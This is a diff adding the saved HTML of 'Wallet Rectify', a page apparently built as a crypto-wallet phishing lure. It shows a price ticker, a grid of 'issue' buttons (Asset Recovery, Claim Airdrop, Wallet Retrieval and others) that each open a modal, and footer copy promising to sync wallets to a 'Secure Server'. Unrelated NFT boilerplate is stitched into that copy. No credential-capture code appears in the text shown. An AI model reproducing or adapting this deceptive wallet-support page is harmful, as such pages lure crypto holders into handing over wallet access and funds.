+						<a href="https://www.cryptocompare.com/coins/link/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/link.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LINK: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LINK_EUR">
+								€ 6.55
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LINK_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLINK_EUR">3.17 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/link/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/link.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LINK: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LINK_CNY">
+								¥ 4.81
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LINK_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLINK_CNY">0.98 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/link/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/link.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LINK: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LINK_GBP">
+								£ 5.60
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LINK_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLINK_GBP">2.51 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xmr/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xmr.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XMR: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XMR_USD">
+								$ 311.10
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XMR_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXMR_USD">1.87 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xmr/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xmr.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XMR: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XMR_EUR">
+								€ 272.53
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XMR_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXMR_EUR">1.70 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xmr/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xmr.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XMR: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XMR_CNY">
+								¥ 199.65
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XMR_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctXMR_CNY">-0.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xmr/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xmr.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XMR: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XMR_GBP">
+								£ 232.97
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XMR_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXMR_GBP">1.05 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/atom/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/atom.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ATOM: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ATOM_USD">
+								$ 1.54
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ATOM_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctATOM_USD">2.35 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/atom/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/atom.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ATOM: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ATOM_EUR">
+								€ 1.35
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ATOM_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctATOM_EUR">2.18 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/atom/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/atom.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ATOM: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ATOM_CNY">
+								¥ 0.9917
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ATOM_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctATOM_CNY">-0.02 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/atom/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/atom.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ATOM: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ATOM_GBP">
+								£ 1.16
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ATOM_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctATOM_GBP">1.53 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/etc/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/etc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETC_USD">
+								$ 7.03
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETC_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETC_USD">2.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/etc/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/etc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETC_EUR">
+								€ 6.16
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETC_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETC_EUR">2.35 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/etc/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/etc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETC_CNY">
+								¥ 65.60
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETC_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETC_CNY">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/etc/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/etc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETC_GBP">
+								£ 5.27
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETC_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETC_GBP">1.70 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<style></style>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<section class="py-5" id="features">
+		<div class="container my-4">
+
+			<div class="mb-3">
+				<div class="d-flex align-items-center justify-content-between mb-3">
+					<div class="h4 m-0 fw-bold">Features 🌟</div>
+				</div>
+				<div class="row g-3">
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-box-seam text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">ST/LT Investment</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-record-btn text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Asset Recovery</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-eraser text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Rectification</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-speedometer text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">High Gas Fees</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-bar-chart-steps text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Slippage Error</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-calculator text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Error</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-bounding-box text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Cross Chain Transfer</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-cash-coin text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Staking Issues</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-bank text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Swap/Exchange</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-handbag text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Reflection</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-gear-wide-connected text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Dapps Reconnection</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-person-badge text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Login Issues</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-droplet text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Airdrop</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-image-alt text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">NFTS Issues</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-123 text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Missing/Irregular Balances
+										</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-bandaid text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Threats Scan</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-alarm text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Delays</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-lock text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Locked Accounts</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-wallet text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Trading Wallet Issues</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-bag text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Tokens Purchase</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-heart text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Whitelist</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-motherboard text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Issurance</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Retrieval</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+						<div class="selected_features">
+							<div class="p-2 rounded shadow-osahan bg-white card border-0">
+								<div class="card-body text-center py-1">
+									<i
+										class="bi bi-three-dots text-primary border border-white rounded-circle bg-white features_icon"></i>
+									<a onclick="toggleModal()" href="#">
+										<h6 class="card-title mb-1 text-dark fw-bold mt-2">Others</h6>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<section class="bg-dark py-4">
+		<div class="container py-4">
+			<div class="row justify-content-center">
+				<div class="col-xl-6 col-lg-7 col-md-8 col-12">
+					<div class="text-center py-4">
+						<small class="text-white-50">- Wallet Rectify -</small>
+						<h1 class="fw-bold text-white py-3">We make sure that everyone is able to securely use their
+							wallet</h1>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<footer class="footer bg-white py-5">
+		<div class="container py-4">
+			<div class="row">
+				<div class="col-md-12 col-lg-4 col-12">
+					<div class="row">
+						<div class="col-3">
+							<img src="./Validate, Synchronize, and Invest your assets and wallets_files/dapp_logo.png"
+								alt="#" class="img-fluid">
+						</div>
+						<div class="col-9 mt-2">
+							<h4>Wallet Rectify</h4>
+						</div>
+					</div>
+					<div class="text-muted mt-4">
+						<p class="mb-4">Open and decentralized protocol for syncing various Wallets to Dapps Secure
+							Server. This is not an app but a protocol that establishes a remote connection between
+							two/more apps and/or devices</p>
+						<p>
+							Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes
+							this new aproch to digital ownership possible. Open and decentralized protocol for syncing
+							various Wallets issues on Secure Server. It is an online server which gets you across to
+							every wallet representative to enable effective complain and rectification of issues.
+						</p>
+					</div>
+				</div>
+				<div class="col-md-12 col-lg-4 col-12">
+					<script type="text/javascript">
+						baseUrl = "https://widgets.cryptocompare.com/";
+						var scripts = document.getElementsByTagName("script");
+						var embedder = scripts[scripts.length - 1];
+						(function () {
+							var appName = "google.com";
+							var s = document.createElement("script");
+							s.type = "text/javascript";
+							s.async = true;
+							var theUrl = baseUrl + 'serve/v1/coin/feed?fsym=BTC&tsym=USD';
+							s.src = theUrl + (theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+							embedder.parentNode.appendChild(s);
+						})();
+					</script>
+					<script type="text/javascript" async=""
+						src="./Validate, Synchronize, and Invest your assets and wallets_files/feed"></script>
+					<div class="ccc-widget ccc-feed" style="line-height: 1;">
+						<div
+							style="background: rgb(255, 255, 255); border-radius: 10px 10px 0px 0px; border: 1px solid rgb(224, 230, 239); box-sizing: border-box; padding-bottom: 0px;">
+							<div style="font-size: 23px; font-weight: 700; padding: 10px 10px 0px;"><a
+									href="https://www.cryptocompare.com/coins/btc/overview" rel="nofollow"
+									title="BTC Price and market cap" target="_blank"
+									style="color: #000; text-decoration: none;"> <span> <img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/btc.png"
+											style="width: 20px; height: 20px; vertical-align: middle; border: 0;"> <span
+											style="font-size: 15px;">BTC</span> <span
+											style="font-size: 11px; font-weight: bold; display: none; ">BTC</span> $
+										60,371.4 </span> <span
+										style="font-size: 13px; font-weight: bold; color: #3d9400;"> (2.49%)
+									</span></a><a href="https://www.cryptocompare.com/dev/widget/wizard/" rel="nofollow"
+									style="float: right; font-size: 10px; font-weight: normal; text-decoration: none; color: #999; margin-top: 0px; text-align: right; line-height:1;"
+									target="_blank"> powered by <br><b style="color: #2B5A99;">CryptoCompare</b></a>
+							</div>
+							<div
+								style="overflow: hidden; color: rgb(1, 1, 1); padding-top: 10px; padding-bottom: 10px;">
+								<div
+									style="float: left; font-size: 11px; font-weight: normal; line-height: 11px; margin-right: 0px; padding-left: 10px; margin-top: 0px; margin-bottom: 5px;">
+									<b style="color: #a5a5a5; border-left: 3px solid #fdc904; padding-left: 5px;"> Last
+										updated:</b> <span style="color: #000;"> Just now</span></div>
+								<div
+									style="float: right; font-size: 11px; font-weight: normal; line-height: 11px; padding-right: 10px; margin-top: 0px; margin-bottom: 5px;">
+									<b style="color: #a5a5a5; border-left: 3px solid #fdc904; padding-left: 5px;"> USD
+										Vol:</b> <span style="color: #000;"> $ 1.63 B</span></div>
+								<div
+									style="clear: both; margin: 0px; padding: 0px; height: 0px; display: block; visibility: hidden;">
+								</div>
+								<div
+									style="float: left; font-size: 11px; font-weight: normal; line-height: 11px; margin-right: 0px; padding-left: 10px; margin-top: 0px; margin-bottom: 0px;">
+									<b style="color: #a5a5a5; border-left: 3px solid #fdc904; padding-left: 5px;">Mkt
+										Cap:</b> <span style="color: #000"> $ 1,210.51 B</span></div>
+								<div
+									style="float: right; font-size: 11px; font-weight: normal; line-height: 11px; padding-right: 10px; margin-top: 0px; margin-bottom: 0px;">
+									<b style="color: #a5a5a5; border-left: 3px solid #fdc904; padding-left: 5px;">All
+										Vol:</b> <span style="color: #000;"> $ 17.90 B</span></div>
+							</div>
+							<div><iframe class="chartjs-hidden-iframe"
+									style="width: 100%; display: block; border: 0px; height: 0px; margin: 0px; position: absolute; inset: 0px;"
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/saved_resource.html"></iframe><canvas
+									height="105" style="display: block; width: 394px; height: 105px;"
+									width="394"></canvas></div>
+							<div style="overflow-y: scroll; height: 300px;">
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/xrp-price-4-to-6-grok-ai-forecast-end-2026"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235703.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/xrp-price-4-to-6-grok-ai-forecast-end-2026"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> XRP Price Could Reach $4 to $6 by End of 2026, Grok AI Model Forecasts
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.coindesk.com/markets/2026/07/02/taiko-s-bridge-is-back-online-after-usd1-7-million-hack-and-its-token-is-up-a-staggering-136"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235537.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.coindesk.com/markets/2026/07/02/taiko-s-bridge-is-back-online-after-usd1-7-million-hack-and-its-token-is-up-a-staggering-136"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Taiko fully restores cross-chain bridge just 10 days after a $1.7 million
+									hack
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
